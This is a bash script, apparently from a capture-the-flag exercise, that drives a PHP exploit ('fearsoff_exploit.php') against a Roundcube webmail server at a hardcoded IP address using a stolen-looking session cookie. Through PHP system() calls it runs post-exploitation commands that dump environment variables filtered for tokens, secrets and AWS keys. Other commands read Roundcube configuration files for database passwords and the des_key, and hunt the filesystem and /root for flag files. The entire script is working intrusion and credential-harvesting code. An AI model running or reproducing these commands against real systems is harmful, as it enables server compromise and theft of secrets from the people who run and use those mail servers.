#!/bin/bash
# 환경 변수 + 설정 파일 직접 읽기

TARGET="http://13.125.104.131:30083"
SESSION_COOKIE="roundcube_sessauth=pppFdrSD1OslI9oOCaYj4CVgUd-1787101200; roundcube_sessid=i02l4jam87su5mp5mieh6hq9od"

echo "=== 환경 변수 + 설정 파일 탐색 ==="
echo

# fearsoff_exploit.php로 실행할 명령들
COMMANDS=(
  # 1. 환경 변수
  "env | grep -iE 'STAGE|FLAG|TOKEN|SECRET|AWS|ENDPOINT|INTERNAL|PROXY'"
  
  # 2. PHP 설정 파일들
  "cat /usr/share/roundcube/config/config.inc.php 2>/dev/null | grep -E 'db_|des_key|password|STAGE|FLAG' | head -20"
  
  # 3. /etc/roundcube
  "cat /etc/roundcube/config.php 2>/dev/null | head -50"
  
  # 4. 파일 시스템: flag 파일 찾기
  "find / -name '*flag*' -o -name '*stage4*' 2>/dev/null | head -20"
  
  # 5. /root 디렉토리
  "ls -la /root/ 2>/dev/null"
  
  # 6. /opt 디렉토리
  "ls -la /opt/ 2>/dev/null"
  
  # 7. /srv 디렉토리
  "ls -la /srv/ 2>/dev/null"
  
  # 8. /var/lib/mysql 구조
  "ls -la /var/lib/mysql/ 2>/dev/null | head -30"
)

# PHP exploit로 실행
php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" << 'EXPLOIT'
<?php
// 명령 배열
$commands = array(
  "01_env_vars" => "env | grep -iE 'STAGE|FLAG|TOKEN|SECRET|AWS|ENDPOINT|INTERNAL|PROXY'",
  "02_roundcube_config" => "cat /usr/share/roundcube/config/config.inc.php 2>/dev/null | grep -E 'db_|des_key|password|STAGE|FLAG' | head -20",
  "03_etc_config" => "cat /etc/roundcube/config.php 2>/dev/null | head -50",
  "04_find_flag" => "find / -name '*flag*' -o -name '*stage4*' 2>/dev/null | head -20",
  "05_root_dir" => "ls -la /root/ 2>/dev/null",
  "06_opt_dir" => "ls -la /opt/ 2>/dev/null",
  "07_srv_dir" => "ls -la /srv/ 2>/dev/null",
  "08_mysql_dir" => "ls -la /var/lib/mysql/ 2>/dev/null | head -30"
);

foreach ($commands as $name => $cmd) {
  echo "\n[*] $name:\n";
  echo str_repeat("=", 60) . "\n";
  system($cmd);
  echo "\n";
}
?>
EXPLOIT
